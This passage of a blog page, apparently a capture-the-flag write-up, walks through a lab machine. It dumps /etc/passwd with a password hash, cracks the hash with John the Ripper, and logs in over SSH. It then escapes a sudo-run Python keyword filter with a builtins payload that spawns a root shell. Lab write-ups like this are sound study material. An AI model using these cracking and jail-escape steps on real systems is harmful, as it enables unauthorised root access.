+</span></span><span style="display:flex;"><span>uuidd:x:108:112::/run/uuidd:/bin/false
+</span></span><span style="display:flex;"><span>dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+</span></span><span style="display:flex;"><span>statd:x:110:65534::/var/lib/nfs:/bin/false
+</span></span><span style="display:flex;"><span>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
+</span></span><span style="display:flex;"><span>vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+</span></span><span style="display:flex;"><span>ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
+</span></span><span style="display:flex;"><span>kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>What is rize username ? <code>kamishiro</code>
+We have find a possible hash:</p>
+<pre tabindex="0"><code>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
+</code></pre><h2 id="crack-the-hash">Crack the Hash<a href="#crack-the-hash" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I <code>crack</code> this hash with <code>John The Ripper</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nano hash2                                
+  
+┌──(kali㉿kali)-[~]
+└─$ john hash2  -wordlist:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+password123      (?)     
+1g 0:00:00:00 DONE (2023-02-14 16:12) 1.666g/s 2560p/s 2560c/s 2560C/s cuties..mexico1
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre><ul>
+<li>Credentials:</li>
+</ul>
+<pre tabindex="0"><code>- Username: kamishiro
+- Password: password123 
+</code></pre><p>I login in the Target Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh kamishiro@10.10.250.26
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.250.26 (10.10.250.26)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:oo//h4aM0BBJSlV7s7eejBvC/3yzDDk/PL7KIK6mewQ.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.250.26<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kamishiro@10.10.250.26&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.7 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-197-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This system is built by the Bento project by Chef Software
+</span></span><span style="display:flex;"><span>More information can be found at https://github.com/chef/bento
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sat Jan <span style="color:#ae81ff">23</span> 22:29:38 <span style="color:#ae81ff">2021</span> from 192.168.77.1
+</span></span><span style="display:flex;"><span>kamishiro@vagrant:~$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">588</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> jail.py
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> user.txt
+</span></span><span style="display:flex;"><span>kamishiro@vagrant:~$ cat user.txt
+</span></span><span style="display:flex;"><span>e6215e25c0783eb4279693d9f073594a
+</span></span><span style="display:flex;"><span>kamishiro@vagrant:~$ 
+</span></span></code></pre></div><p><code>user.txt</code> :</p>
+<pre tabindex="0"><code>e6215e25c0783eb4279693d9f073594a
+</code></pre><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see all <code>sudo privileges</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kamishiro@vagrant:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> kamishiro on vagrant.vm:
+</span></span><span style="display:flex;"><span>    env_reset, exempt_group<span style="color:#f92672">=</span>sudo, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User kamishiro may run the following commands on vagrant.vm:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/bin/python3 /home/kamishiro/jail.py
+</span></span></code></pre></div><ol start="2">
+<li>I see the code of <code>/home/kamishiro/jail.py</code>:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kamishiro@vagrant:~$ cat /home/kamishiro/jail.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#! /usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#-*- coding:utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Hi! Welcome to my world kaneki&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;========================================================================&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;What ? You gonna stand like a chicken ? fight me Kaneki&#34;</span>)
+</span></span><span style="display:flex;"><span>    text <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> keyword <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;read&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;write&#39;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> keyword <span style="color:#f92672">in</span> text:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Do you think i will let you do this ??????&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        exec(text)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;No Kaneki you are so dead&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>The vulnerability come from the <code>exec()</code> function, to exploit this function I read the documentation from this site <a href="https://anee.me/escaping-python-jails-849c65cf306e">Escaping_Python_Jails</a></p>
+<p>Now I spawn the <code>root shell</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kamishiro@vagrant:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> kamishiro on vagrant.vm:
+</span></span><span style="display:flex;"><span>    env_reset, exempt_group<span style="color:#f92672">=</span>sudo, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User kamishiro may run the following commands on vagrant.vm:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/bin/python3 /home/kamishiro/jail.py
+</span></span><span style="display:flex;"><span>kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
+</span></span><span style="display:flex;"><span>Hi! Welcome to my world kaneki
+</span></span><span style="display:flex;"><span><span style="color:#f92672">========================================================================</span>
+</span></span><span style="display:flex;"><span>What ? You gonna stand like a chicken ? fight me Kaneki
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; __builtins__.__dict__<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;__IMPORT__&#39;</span>.lower<span style="color:#f92672">()](</span><span style="color:#e6db74">&#39;OS&#39;</span>.lower<span style="color:#f92672">())</span>.__dict__<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SYSTEM&#39;</span>.lower<span style="color:#f92672">()](</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span><span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>root@vagrant:~# cat /root/root.txt
+</span></span><span style="display:flex;"><span>9d790bb87898ca66f724ab05a9e6000b
+</span></span></code></pre></div><p><code>root.txt</code> :</p>
+<pre tabindex="0"><code>9d790bb87898ca66f724ab05a9e6000b
+</code></pre><h2 id="patch-the-machine-vulnerabilities">Patch the machine vulnerabilities<a href="#patch-the-machine-vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I <code>remove</code> the file that <code>generate</code> the <code>privilege escalation</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@vagrant:~# rm /home/kamishiro/jail.py
+</span></span></code></pre></div><p>I leave my <code>signature</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@vagrant:~# touch README.txt
+</span></span><span style="display:flex;"><span>root@vagrant:~# echo <span style="color:#e6db74">&#39;CyberSpider  has been here, Now I am root :)&#39;</span> &gt; README.txt
+</span></span><span style="display:flex;"><span>root@vagrant:~#  cat README.txt
+</span></span><span style="display:flex;"><span>CyberSpider  has been here, Now I am root :<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@vagrant:~# chmod a<span style="color:#f92672">=</span>+r-x-w README.txt
+</span></span><span style="display:flex;"><span>root@vagrant:~# ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">14</span> 21:46 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">18</span> Feb <span style="color:#ae81ff">14</span> 21:34 .bash_history
+</span></span><span style="display:flex;"><span>-r--r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">45</span> Feb <span style="color:#ae81ff">14</span> 21:46 README.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> user.txt
+</span></span><span style="display:flex;"><span>root@vagrant:~# 
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/inject/">
+                <span class="button__text">HTB Writeup - Inject (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>CyberSpider</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
